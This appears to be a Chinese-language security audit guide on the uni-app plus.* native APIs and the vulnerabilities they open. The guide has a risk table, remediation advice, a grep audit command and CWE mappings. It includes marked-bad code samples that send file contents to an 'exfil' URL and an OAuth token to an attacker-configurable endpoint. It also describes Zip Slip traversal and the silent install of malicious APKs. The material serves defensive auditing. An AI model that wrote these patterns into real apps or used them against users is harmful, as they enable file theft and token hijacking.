# plus.runtime API 与设备能力滥用

## 概览

App-plus 环境提供 `plus.*` 全局对象，暴露原生能力：

| API | 能力 | 风险 |
|-----|------|------|
| plus.runtime.openURL(url) | 打开任意 URL / Scheme | 深链劫持 |
| plus.runtime.launchApplication({action, ...}) | 拉起其他 App | Intent 劫持 |
| plus.runtime.install(path) | 安装 APK | 静默安装恶意 App |
| plus.runtime.restart() | 重启 App | 拒绝服务 |
| plus.io.resolveLocalFileSystemURL(path) | 访问文件系统 | 路径穿越 |
| plus.uploader.createUpload(url) | 上传任意文件 | 数据窃取 |
| plus.downloader.createDownload(url) | 下载任意文件 | 恶意下载 |
| plus.storage.* | 本地存储 | 密钥泄露 |
| plus.oauth.* | 三方登录 | Token 劫持 |
| plus.zip.* | 解压/压缩 | Zip Slip |

## 高危场景

### 1. 任意文件读取

```js
// ❌ 路径可控
plus.io.resolveLocalFileSystemURL(userPath, (entry) => {
  entry.file((file) => {
    const reader = new plus.io.FileReader();
    reader.onloadend = (e) => uni.request({ url: exfil, data: e.target.result });
    reader.readAsText(file);
  });
});
```

若 `userPath` 来自服务端字段，攻击者可读：
- `_documents/` 下的会话缓存
- `_www/config.json` 应用配置
- App 沙盒内的 SQLite

### 2. Zip Slip

```js
plus.zip.decompress(zipPath, targetDir, () => {
  // 解压完成
});
```

若 `zipPath` 是攻击者控制的下载文件，其中 entry name 含 `../../../../data/data/com.app/`，
plus.zip 未做路径规范化 → 覆盖 App 私有目录。

修复：
- 服务端签名 zip；客户端校验签名
- 解压前遍历 entry name，reject `..`

### 3. 静默安装 APK（Android）

```js
plus.runtime.install(apkPath, {}, () => {
  console.log('installed');
});
```

需要 `INSTALL_PACKAGES` 权限（一般 App 无），但若攻击者能修改本 App
逻辑或代码热更新 → 安装恶意升级包。

修复：
- 禁用运行时 install，仅走应用市场
- 若必须自主升级，签名校验 + HTTPS 强制 + 版本降级拒绝

### 4. Intent 劫持

```js
// Android
plus.runtime.launchApplication({
  action: 'android.intent.action.VIEW',
  extra: { url: userSuppliedUrl }
});
```

`userSuppliedUrl` 若是 `market://details?id=malicious.pkg` → 引导用户下载伪造 App。

### 5. plus.oauth token 泄露

```js
plus.oauth.getServices((services) => {
  services[0].login((event) => {
    const token = event.target.authResult.access_token;
    uni.request({ url: userConfigurableEndpoint, data: { token } });  // ❌
  });
});
```

## 审计动作

```bash
grep -rEn 'plus\.(runtime|io|uploader|downloader|storage|zip|oauth|nativeUI|geolocation|contacts|camera)\.' src/
```

分类查看：
- 参数是否可控
- 是否有权限确认对话框
- 是否走 utils 中间层

## 权限模型

manifest.json:

```json
{
  "app-plus": {
    "distribute": {
      "android": {
        "permissions": [
          "<uses-permission android:name=\"android.permission.INTERNET\"/>",
          "<uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/>",
          ...
        ]
      },
      "ios": {
        "privacyDescription": {
          "NSCameraUsageDescription": "..."
        }
      }
    }
  }
}
```

**最小权限**：
- 不使用 `WRITE_EXTERNAL_STORAGE` = 无法写系统目录
- 不申请 `REQUEST_INSTALL_PACKAGES` = 无法安装 APK
- 不申请 `CALL_PHONE` = 无法自动拨号

## 相关规则

- CWE: CWE-22 (Path Traversal / Zip Slip)
- CWE: CWE-73 (External Control of File Name)
- CWE: CWE-306 (Missing Auth on privileged action)
- 内建 pattern: `uniapp_plus_runtime`
- CVSS: 8.1
